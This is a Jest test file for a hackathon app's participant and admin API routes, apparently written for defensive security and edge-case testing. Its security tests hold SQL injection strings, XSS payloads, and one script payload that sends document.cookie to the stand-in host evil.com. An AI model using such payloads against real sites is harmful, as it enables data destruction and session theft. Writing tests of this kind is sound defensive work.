import { POST as registrationPOST, PUT as profilePUT } from '@/app/api/participant/profile/route';
import { PUT as adminPUT } from '@/app/api/participants/[id]/route';
import { auth } from '@/auth';
import { isOrganizer } from '@/lib/admin';
import { db } from '@/lib/db';
import {
  setupMocks,
  resetMocks,
  createMockRequest,
  createMockSession,
  createAdminSession,
  createMockParticipant,
  createMaliciousRequest,
  createLargeDataRequest,
  createConcurrentRequests,
  setupExistingUser,
  setupActiveHackathon,
} from '../utils/test-helpers';

// Mock dependencies
jest.mock('@/auth');
jest.mock('@/lib/admin');
jest.mock('@/lib/db', () => ({
  db: {
    user: {
      findUnique: jest.fn(),
      create: jest.fn(),
      update: jest.fn(),
    },
    participant: {
      findUnique: jest.fn(),
      create: jest.fn(),
      update: jest.fn(),
    },
    team: {
      findMany: jest.fn(),
      findUnique: jest.fn(),
      create: jest.fn(),
      update: jest.fn(),
    },
    hackathon: {
      findUnique: jest.fn(),
      findMany: jest.fn(),
    },
    $transaction: jest.fn(),
  },
}));
jest.mock('@/lib/hackathon');

describe('Security & Edge Cases', () => {
  beforeEach(() => {
    setupMocks();
  });

  afterEach(() => {
    resetMocks();
  });

  describe('Security Scenarios', () => {
    // TC-SEC-001: SQL Injection in Profile Fields
    describe('TC-SEC-001: SQL Injection in Profile Fields', () => {
      it('should prevent SQL injection in name field', async () => {
        const hackathon = setupActiveHackathon();
        const user = setupExistingUser(false);

        const maliciousPayload = {
          name: "'; DROP TABLE participants; --",
          email: 'test@example.com',
        };

        const participant = createMockParticipant({
          name: maliciousPayload.name, // Should be stored as-is, not executed
        });

        // Mock user lookup
        (db.user.findUnique as jest.Mock).mockResolvedValue({
          ...user,
          participant: null,
        });

        // Mock successful transaction
        (db.$transaction as jest.Mock).mockImplementation(async (callback) => {
          const tx = {
            participant: { create: jest.fn().mockResolvedValue(participant) },
            hackathonParticipation: { create: jest.fn().mockResolvedValue({}) },
          };
          await callback(tx);
          return {
            participant,
            team: null,
            isLeader: false,
          };
        });

        const request = createMaliciousRequest(maliciousPayload);
        const response = await registrationPOST(request);

        expect(response.status).toBe(200);
        // Verify the malicious input was treated as data, not SQL
        expect(db.$transaction).toHaveBeenCalled();
      });

      it('should handle SQL injection attempts in multiple fields', async () => {
        const hackathon = setupActiveHackathon();
        const user = setupExistingUser(false);

        const maliciousPayload = {
          name: "Robert'; DELETE FROM users WHERE '1'='1",
          email: 'test@example.com',
          city: "'; UPDATE participants SET name='hacked' WHERE '1'='1",
          company: "'; INSERT INTO participants (name) VALUES ('injected'); --",
        };

        const participant = createMockParticipant(maliciousPayload);
        
        // Mock user lookup
        (db.user.findUnique as jest.Mock).mockResolvedValue({
          ...user,
          participant: null,
        });

        // Mock successful transaction
        (db.$transaction as jest.Mock).mockImplementation(async (callback) => {
          const tx = {
            participant: { create: jest.fn().mockResolvedValue(participant) },
            hackathonParticipation: { create: jest.fn().mockResolvedValue({}) },
          };
          await callback(tx);
          return {
            participant,
            team: null,
            isLeader: false,
          };
        });

        const request = createMaliciousRequest(maliciousPayload);
        const response = await registrationPOST(request);

        expect(response.status).toBe(200);
        // All fields should be stored as literal strings, not executed as SQL
      });
    });

    // TC-SEC-002: XSS in Profile Data
    describe('TC-SEC-002: XSS in Profile Data', () => {
      it('should handle script injection in profile fields', async () => {
        const user = setupExistingUser(true);

        const xssPayload = {
          name: "<script>alert('xss')</script>",
          company: "<img src=x onerror=alert('xss')>",
          telegram: "javascript:alert('xss')",
          githubUrl: "javascript:alert(document.cookie)",
        };

        const participant = createMockParticipant(xssPayload);
        
        // Mock user lookup
        (db.user.findUnique as jest.Mock).mockResolvedValue({
          ...user,
          participant: createMockParticipant({ userId: user.id }),
        });
        
        (db.participant.update as jest.Mock).mockResolvedValue(participant);
        (db.participant.findUnique as jest.Mock).mockResolvedValue(participant);

        const request = createMockRequest(
          'http://localhost:3000/api/participant/profile',
          { method: 'PUT', body: xssPayload }
        );

        const response = await profilePUT(request);

        expect(response.status).toBe(200);
        // Data should be stored as-is; XSS prevention should happen on display
        expect(db.participant.update).toHaveBeenCalledWith({
          where: { id: user.participant!.id },
          data: expect.objectContaining({
            name: "<script>alert('xss')</script>",
            company: "<img src=x onerror=alert('xss')>",
          }),
        });
      });

      it('should handle complex XSS payloads', async () => {
        const user = setupExistingUser(true);

        const complexXSS = {
          name: "Test User",
          company: `<svg onload="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">`,
          otherTechnologies: `"><script>fetch('evil.com?cookies='+document.cookie)</script>`,
        };

        const participant = createMockParticipant(complexXSS);
        (db.participant.update as jest.Mock).mockResolvedValue(participant);
        (db.participant.findUnique as jest.Mock).mockResolvedValue(participant);

        const request = createMockRequest(
          'http://localhost:3000/api/participant/profile',
          { method: 'PUT', body: complexXSS }
        );

        const response = await profilePUT(request);

        expect(response.status).toBe(200);
        // Should store the data without execution
      });
    });

    // TC-SEC-003: CSRF Token Validation
    describe('TC-SEC-003: CSRF Token Validation', () => {
      it('should handle requests without proper headers', async () => {
        const user = setupExistingUser(true);

        const request = createMockRequest(
          'http://localhost:3000/api/participant/profile',
          {
            method: 'PUT',
            body: { name: 'Test User' },
            headers: {
              // Missing CSRF token or other security headers
              'origin': 'https://malicious-site.com',
              'referer': 'https://malicious-site.com/attack',
            },
          }
        );

        const response = await profilePUT(request);

        // Should either succeed (if CSRF protection is handled elsewhere)
        // or fail with appropriate security error
        expect([200, 403, 400]).toContain(response.status);
      });
    });

    // TC-SEC-004: Rate Limiting
    describe('TC-SEC-004: Rate Limiting', () => {
      it('should handle rapid repeated requests', async () => {
        const user = setupExistingUser(true);
        const participant = createMockParticipant();

        (db.participant.update as jest.Mock).mockResolvedValue(participant);
        (db.participant.findUnique as jest.Mock).mockResolvedValue(participant);

        const requestFactory = () => async () => {
          const request = createMockRequest(
            'http://localhost:3000/api/participant/profile',
            { method: 'PUT', body: { name: 'Rapid Request' } }
          );
          return profilePUT(request);
        };

        // Simulate 20 rapid requests
        const responses = await createConcurrentRequests(20, requestFactory());

        // All requests should complete (rate limiting might be handled at infrastructure level)
        responses.forEach(response => {
          expect([200, 429]).toContain(response.status); // 429 = Too Many Requests
        });

        // Service should remain stable
        expect(responses.length).toBe(20);
      });
    });

    // TC-SEC-005: Session Hijacking Attempt
    describe('TC-SEC-005: Session Hijacking Attempt', () => {
      it('should handle invalid session tokens', async () => {
        // Mock invalid/expired session
        (auth as jest.Mock).mockResolvedValue(null);

        const request = createMockRequest(
          'http://localhost:3000/api/participant/profile',
          { method: 'PUT', body: { name: 'Hijacked Request' } }
        );

        const response = await profilePUT(request);
        const data = await response.json();

        expect(response.status).toBe(401);
        expect(data.error).toBe('Не авторизован');
      });

      it('should validate session consistency', async () => {
        // Mock session with mismatched data
        (auth as jest.Mock).mockResolvedValue({
          user: {
            email: 'legitimate@user.com',
            // Potentially hijacked session with inconsistent data
          },
        });

        setupExistingUser(true);

        const request = createMockRequest(
          'http://localhost:3000/api/participant/profile',
          { method: 'PUT', body: { name: 'Suspicious Update' } }
        );

        const response = await profilePUT(request);

        // Should either succeed with proper validation or fail securely
        expect([200, 401, 403]).toContain(response.status);
      });
    });

    // Authorization Bypass Attempts
    describe('Authorization Bypass Attempts', () => {
      it('should prevent privilege escalation in admin endpoints', async () => {
        // Regular user trying to use admin endpoint
        (auth as jest.Mock).mockResolvedValue(createMockSession());
        (isOrganizer as jest.Mock).mockResolvedValue(false);

        const request = createMockRequest(
          'http://localhost:3000/api/participants/target-participant',
          { method: 'PUT', body: { name: 'Unauthorized Admin Update' } }
        );

        const mockParams = Promise.resolve({ id: 'target-participant' });
        const response = await adminPUT(request, { params: mockParams });
        const data = await response.json();

        expect(response.status).toBe(401);
        expect(data.error).toBe('Unauthorized');
        expect(db.participant.update).not.toHaveBeenCalled();
      });

      it('should validate role consistency', async () => {
        // Session claims admin but isOrganizer returns false
        (auth as jest.Mock).mockResolvedValue({
          user: {
            email: 'fake-admin@test.com',
            role: 'admin', // Claimed role
          },
        });
        (isOrganizer as jest.Mock).mockResolvedValue(false); // Actual check

        const request = createMockRequest(
          'http://localhost:3000/api/participants/target-participant',
          { method: 'PUT', body: { name: 'Role Bypass Attempt' } }
        );

        const mockParams = Promise.resolve({ id: 'target-participant' });
        const response = await adminPUT(request, { params: mockParams });

        expect(response.status).toBe(401);
        expect(isOrganizer).toHaveBeenCalledWith('fake-admin@test.com');
      });
    });
  });

  describe('Data Integrity', () => {
    // TC-DATA-001: Concurrent Writes
    describe('TC-DATA-001: Concurrent Writes', () => {
      it('should handle concurrent profile updates', async () => {
        const user = setupExistingUser(true);

        // Mock different update results for concurrent operations
        const update1 = createMockParticipant({ name: 'Update 1', city: 'City 1' });
        const update2 = createMockParticipant({ name: 'Update 2', city: 'City 2' });

        // Mock user lookup for both concurrent requests
        (db.user.findUnique as jest.Mock).mockResolvedValue({
          ...user,
          participant: createMockParticipant({ userId: user.id }),
        });

        (db.participant.update as jest.Mock)
          .mockResolvedValueOnce(update1)
          .mockResolvedValueOnce(update2);

        (db.participant.findUnique as jest.Mock)
          .mockResolvedValueOnce(update1)
          .mockResolvedValueOnce(update2);

        const request1 = createMockRequest(
          'http://localhost:3000/api/participant/profile',
          { method: 'PUT', body: { name: 'Update 1', city: 'City 1' } }
        );

        const request2 = createMockRequest(
          'http://localhost:3000/api/participant/profile',
          { method: 'PUT', body: { name: 'Update 2', city: 'City 2' } }
        );

        const [response1, response2] = await Promise.all([
          profilePUT(request1),
          profilePUT(request2),
        ]);

        expect(response1.status).toBe(200);
        expect(response2.status).toBe(200);
        expect(db.participant.update).toHaveBeenCalledTimes(2);
      });
    });

    // TC-DATA-002: Database Connection Loss
    describe('TC-DATA-002: Database Connection Loss', () => {
      it('should handle database unavailability gracefully', async () => {
        const user = setupExistingUser(true);

        // Mock user lookup
        (db.user.findUnique as jest.Mock).mockResolvedValue({
          ...user,
          participant: createMockParticipant({ userId: user.id }),
        });

        (db.participant.update as jest.Mock).mockRejectedValue(new Error('connection refused'));

        const request = createMockRequest(
          'http://localhost:3000/api/participant/profile',
          { method: 'PUT', body: { name: 'Database Error Test' } }
        );

        const response = await profilePUT(request);
        const data = await response.json();

        expect(response.status).toBe(400);
        expect(data.error).toBe('connection refused');
      });
    });

    // TC-DATA-003: Partial Transaction Failure
    describe('TC-DATA-003: Partial Transaction Failure', () => {
      it('should rollback transactions on failure', async () => {
        const hackathon = setupActiveHackathon();
        const user = setupExistingUser(false);

        // Mock user lookup
        (db.user.findUnique as jest.Mock).mockResolvedValue({
          ...user,
          participant: null,
        });

        // Mock existing participant lookup to return null (no duplicate)
        (db.participant.findUnique as jest.Mock).mockResolvedValue(null);

        // Mock transaction that fails partway through
        (db.$transaction as jest.Mock).mockRejectedValue(new Error('Transaction failed'));

        const request = createMockRequest(
          'http://localhost:3000/api/participant/profile',
          {
            method: 'POST',
            body: { name: 'Transaction Test', email: 'test@example.com' },
          }
        );

        const response = await registrationPOST(request);
        const data = await response.json();

        expect(response.status).toBe(400);
        expect(data.error).toBe('Transaction failed');
      });
    });

    // TC-DATA-004: Invalid Foreign Key References
    describe('TC-DATA-004: Invalid Foreign Key References', () => {
      it('should handle constraint violations gracefully', async () => {
        (auth as jest.Mock).mockResolvedValue(createAdminSession());
        (isOrganizer as jest.Mock).mockResolvedValue(true);

        const participant = createMockParticipant({ id: 'participant-1' });
        (db.participant.findUnique as jest.Mock).mockResolvedValue(participant);

        // Mock foreign key constraint error
        (db.participant.update as jest.Mock).mockRejectedValue(
          new Error('Foreign key constraint failed on the field: teamId')
        );

        const request = createMockRequest(
          'http://localhost:3000/api/participants/participant-1',
          { method: 'PUT', body: { name: 'Test', teamId: 'invalid-team-id' } }
        );

        const mockParams = Promise.resolve({ id: 'participant-1' });
        const response = await adminPUT(request, { params: mockParams });
        const data = await response.json();

        expect(response.status).toBe(500);
        expect(data.error).toBe('Internal server error');
      });
    });
  });

  describe('Performance', () => {
    // TC-PERF-001: Large Dataset Queries
    describe('TC-PERF-001: Large Dataset Queries', () => {
      it('should handle large profile data efficiently', async () => {
        const user = setupExistingUser(true);
        const largeData = createLargeDataRequest();

        const participant = createMockParticipant({
          ...largeData,
          technologies: JSON.stringify(largeData.technologies),
          cloudServices: JSON.stringify(largeData.cloudServices),
        });

        (db.participant.update as jest.Mock).mockResolvedValue(participant);
        (db.participant.findUnique as jest.Mock).mockResolvedValue(participant);

        const startTime = Date.now();

        const request = createMockRequest(
          'http://localhost:3000/api/participant/profile',
          { method: 'PUT', body: largeData }
        );

        const response = await profilePUT(request);
        const endTime = Date.now();
        const responseTime = endTime - startTime;

        // Should complete within reasonable time (2 seconds for large data)
        expect(responseTime).toBeLessThan(2000);
        expect([200, 400, 413]).toContain(response.status); // Might reject if too large
      });
    });

    // TC-PERF-002: Complex Profile Updates
    describe('TC-PERF-002: Complex Profile Updates', () => {
      it('should handle complex JSON serialization efficiently', async () => {
        const user = setupExistingUser(true);

        const complexData = {
          name: 'Complex User',
          technologies: Array.from({ length: 100 }, (_, i) => ({
            name: `Tech${i}`,
            level: i % 5,
            years: i % 10,
            projects: Array.from({ length: 5 }, (_, j) => `Project${i}-${j}`),
          })),
          cloudServices: Array.from({ length: 50 }, (_, i) => ({
            service: `Service${i}`,
            provider: `Provider${i % 3}`,
            experience: `${i % 5} years`,
          })),
        };

        const participant = createMockParticipant({
          name: complexData.name,
          technologies: JSON.stringify(complexData.technologies),
          cloudServices: JSON.stringify(complexData.cloudServices),
        });

        (db.participant.update as jest.Mock).mockResolvedValue(participant);
        (db.participant.findUnique as jest.Mock).mockResolvedValue(participant);

        const startTime = Date.now();

        const request = createMockRequest(
          'http://localhost:3000/api/participant/profile',
          { method: 'PUT', body: complexData }
        );

        const response = await profilePUT(request);
        const endTime = Date.now();
        const responseTime = endTime - startTime;

        expect(responseTime).toBeLessThan(1000); // Should complete within 1 second
        expect([200, 400]).toContain(response.status);
      });
    });

    // TC-PERF-003: Memory Usage
    describe('TC-PERF-003: Memory Usage', () => {
      it('should handle multiple large operations without memory leaks', async () => {
        const user = setupExistingUser(true);

        const largeOperations = Array.from({ length: 10 }, (_, i) => {
          const largeData = {
            name: `User ${i}`,
            technologies: Array.from({ length: 50 }, (_, j) => `Tech${i}-${j}`),
            cloudServices: Array.from({ length: 25 }, (_, j) => `Service${i}-${j}`),
            otherTechnologies: 'x'.repeat(1000), // 1KB string
          };

          const participant = createMockParticipant({
            ...largeData,
            technologies: JSON.stringify(largeData.technologies),
            cloudServices: JSON.stringify(largeData.cloudServices),
          });

          (db.participant.update as jest.Mock).mockResolvedValueOnce(participant);
          (db.participant.findUnique as jest.Mock).mockResolvedValueOnce(participant);

          return async () => {
            const request = createMockRequest(
              'http://localhost:3000/api/participant/profile',
              { method: 'PUT', body: largeData }
            );
            return profilePUT(request);
          };
        });

        const startTime = Date.now();
        const responses = await Promise.all(largeOperations.map(op => op()));
        const endTime = Date.now();
        const totalTime = endTime - startTime;

        // All operations should complete
        expect(responses).toHaveLength(10);
        responses.forEach(response => {
          expect([200, 400]).toContain(response.status);
        });

        // Should complete all operations within reasonable time
        expect(totalTime).toBeLessThan(5000); // 5 seconds for 10 operations
      });
    });
  });

  describe('Edge Cases', () => {
    // Malformed Request Bodies
    describe('Malformed Request Bodies', () => {
      it('should handle invalid JSON gracefully', async () => {
        setupExistingUser(true);

        const request = new Request('http://localhost:3000/api/participant/profile', {
          method: 'PUT',
          body: '{ invalid json }',
          headers: { 'Content-Type': 'application/json' },
        });

        try {
          const response = await profilePUT(request as any);
          expect([400, 500]).toContain(response.status);
        } catch (error) {
          // Should handle JSON parse errors gracefully
          expect(error).toBeDefined();
        }
      });
    });

    // Unicode and Encoding
    describe('Unicode and Encoding', () => {
      it('should handle various Unicode characters correctly', async () => {
        const user = setupExistingUser(true);

        const unicodeData = {
          name: '测试用户',
          company: 'Компания Тест',
          city: 'Москва',
          telegram: '@пользователь_тест',
          otherTechnologies: '日本語のテクノロジー, العربية التكنولوجيا, 한국어 기술',
        };

        const participant = createMockParticipant(unicodeData);
        
        // Mock user lookup
        (db.user.findUnique as jest.Mock).mockResolvedValue({
          ...user,
          participant: createMockParticipant({ userId: user.id }),
        });
        
        (db.participant.update as jest.Mock).mockResolvedValue(participant);
        (db.participant.findUnique as jest.Mock).mockResolvedValue(participant);

        const request = createMockRequest(
          'http://localhost:3000/api/participant/profile',
          { method: 'PUT', body: unicodeData }
        );

        const response = await profilePUT(request);

        expect(response.status).toBe(200);
        expect(db.participant.update).toHaveBeenCalledWith({
          where: { id: user.participant!.id },
          data: expect.objectContaining({
            name: '测试用户',
            company: 'Компания Тест',
            city: 'Москва',
          }),
        });
      });
    });

    // Network and Infrastructure Edge Cases
    describe('Network and Infrastructure Edge Cases', () => {
      it('should handle timeout scenarios', async () => {
        const user = setupExistingUser(true);

        // Mock user lookup
        (db.user.findUnique as jest.Mock).mockResolvedValue({
          ...user,
          participant: createMockParticipant({ userId: user.id }),
        });

        // Mock a slow database operation
        (db.participant.update as jest.Mock).mockImplementation(() => 
          new Promise((resolve) => setTimeout(resolve, 100)) // 100ms delay
        );

        const request = createMockRequest(
          'http://localhost:3000/api/participant/profile',
          { method: 'PUT', body: { name: 'Timeout Test' } }
        );

        // Should complete even with database delays
        const response = await profilePUT(request);
        expect([200, 500]).toContain(response.status);
      });
    });
  });
});